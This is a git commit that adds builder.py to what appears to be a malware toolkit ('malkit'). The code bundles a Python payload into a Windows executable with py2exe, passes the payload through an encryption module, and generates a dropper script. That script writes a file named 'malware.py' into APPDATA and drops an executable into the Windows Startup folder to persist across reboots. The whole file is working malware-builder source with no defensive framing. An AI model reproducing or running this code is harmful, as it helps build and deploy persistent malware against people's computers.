3ad075cd6e969a0fef60e42bba50007e9d2cc4e8
darkArp <marionascimento047@gmail.com>
2019-11-24 15:55:37 +0100

    add build

---
+++ darkarp/malkit_modules/builder.py
@@ -0,0 +1,110 @@
+import sys
+import os
+import py2exe
+from distutils.core import setup
+import darkarp.malkit_modules.encrypt as encrypt
+from shutil import rmtree
+import time
+
+
+def exebuild(target, include, output, icon="icon.ico"):
+    sys.argv.append("py2exe")
+    setup(
+        options={
+            "py2exe": {
+                "compressed": True,
+                "bundle_files": 1,
+                "optimize": 2,
+                "excludes": [
+                    "pyreadline",
+                    "pdb",
+                    "unittest",
+                    "inspect"
+                    "difflib",
+                    "doctest",
+                    "optparse",
+                    "pickle",
+                    "argparse",
+                    "tarfile",
+                    "typing",
+                    "locale",
+
+                    "_lzma"
+
+                ],
+                "dll_excludes": ["msvcr71.dll", "Crypt32.dll"],
+                "includes": [f'{include}']
+            }
+        },
+        zipfile=None,
+
+        windows=[{
+            "script": target,
+            "icon_resources": [(1, icon)]
+        }]
+
+    )
+    if os.path.exists(f"{output}.exe"):
+        os.remove(f"{output}.exe")
+    os.rename(f"dist\\{target[:-3]}.exe", f"{output}.exe")
+    rmtree("dist")
+    return 0
+
+
+def get_payload(filename: str):
+    encrypt_file(filename)
+    payload = []
+    for line in open(filename, "rb"):
+        payload.append(line)
+    payload = b''.join(payload)
+    decrypt_file(filename)
+    return payload
+
+
+def encrypt_file(filename: str):
+    return print(encrypt.encrypt(filename=filename))
+
+
+def decrypt_file(filename: str):
+    return print(encrypt.fully_decrypt(filename=filename))
+
+
+def gendie(filenames: list):
+    for name in filenames:
+        try:
+            os.remove(f"cryptmod\\{name}.py")
+        except Exception as err:
+            os.remove(f"{name}.exe")
+    return 0
+
+
+def generate_payload(filename, destname, startup, icon):
+    payload = get_payload(filename)
+    exepayload = exe_bytes(startup)
+    start_str = "startups='" + str(startup) + "'\n"
+    APPDATA = "APPDATA = getenv('APPDATA')\n"
+    STARTUP = "STARTUP = f'{APPDATA}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{startups}.exe'\n"
+    pyline = ""
+    pyline += f"from os import getenv\n"
+    pyline += start_str
+    pyline += APPDATA
+    pyline += STARTUP
+    pyline += f"filename = 'malware.py'\n"
+    pyline += "path2 = f'{APPDATA}\\\\{filename}'\n"
+    pyline += f"payload = {payload}\n"
+    pyline += f"exepayload = {exepayload}\n"
+    pyline += f"with open(path2, 'wb') as f:\n"
+    pyline += "    f.write(payload)\n"
+    pyline += f"with open(STARTUP, 'wb') as f:\n"
+    pyline += "    f.write(exepayload)"
+    with open(f"{destname}.py", "wb") as f:
+        f.write(pyline.encode())
+    return f"{destname}"
+
+
+def exe_bytes(filename: str):
+    bytelist = []
+    for line in open(f"{filename}.exe", "rb"):
+        bytelist.append(line)
+    bytelist = b''.join(bytelist)
+    return bytelist
